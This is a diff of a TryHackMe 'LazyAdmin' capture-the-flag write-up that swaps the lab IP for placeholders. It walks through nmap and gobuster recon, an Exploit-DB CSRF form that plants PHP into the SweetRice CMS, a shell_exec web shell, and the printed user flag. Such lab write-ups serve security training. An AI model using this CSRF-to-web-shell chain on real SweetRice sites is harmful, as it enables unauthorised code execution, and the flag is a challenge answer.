@@ -9,7 +9,7 @@ With all of that out of the way, let's jump into the [LazyAdmin](https://tryhack
 To start off, we'll use `nmap` to find out which ports are running:
 
 ```bash
-nmap  -vv -sV -sC 10.10.60.2 -A -T4
+nmap  -vv -sV -sC <IP> -A -T4
 ```
 
 We get the ports 22 and 80. Next, let's try to navigate to the website on port 80. There we see the basic Apache welcome page.
@@ -17,7 +17,7 @@ We get the ports 22 and 80. Next, let's try to navigate to the website on port 8
 To see what else is running on this web server, let's use `gobuster` to find other files and directories
 
 ```bash
-gobuster -u http://10.10.60.2/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x "php,txt,html"
+gobuster -u http://<IP>/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x "php,txt,html"
 ```
 
 This uses the [SecLists](https://github.com/danielmiessler/SecLists) repo's `Web-Content/big.txt` wordlist and we'll initially try for .php, .txt and .html files.
@@ -29,7 +29,7 @@ At this point, it makes sense to go to [Exploit DB](https://www.exploit-db.com/)
 Let's run `gobuster` again, to find resources inside of `content`:
 
 ```bash
-gobuster -u http://10.10.60.2/content/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x "php,txt,html"
+gobuster -u http://<IP>/content/ -w /opt/SecLists/Discovery/Web-Content/big.txt -x "php,txt,html"
 ```
 
 This gives us several things, such as the `/as` folder and the `/inc` folder. Under `/as` we find an administrator login, which is what we were looking for. Inside the `/inc` folder, interestingly, we find MySQL backup, which we immediately download.
@@ -57,7 +57,7 @@ If we look at the exploit on Exploit-DB, it looks like the following:
 ```php
 <html>
     <body onload="document.exploit.submit();">
-        <form action="http://10.10.60.2/content/as/?type=ad&mode=save" method="POST" name="exploit">
+        <form action="http://<IP>/content/as/?type=ad&mode=save" method="POST" name="exploit">
             <input type="hidden" name="adk" value="hacked"/>
             <textarea type="hidden" name="adv">
                 ... add php code here ...
@@ -74,7 +74,7 @@ $output = shell_exec('ls /home');
 echo "<pre>$output</pre>";
 ```
 
-This directs us to the Ads page in the SweetRice backend, with a new ad active. If we now access this using `http://10.10.60.2/content/inc/ads/hacked.php` in this case, then we see the executed PHP code, which shows us the contents of `/home`.
+This directs us to the Ads page in the SweetRice backend, with a new ad active. If we now access this using `http://<IP>/content/inc/ads/hacked.php` in this case, then we see the executed PHP code, which shows us the contents of `/home`.
 
 This way, we can see that the username is `itguy`. Next we can `ls /home/itguy` to see the files inside of the user's folder. There, we can already get the user flag using `cat /home/itguy/user.txt`. The flag is `THM{63e5bce9271952aad1113b6f1ac28a07}`.
 
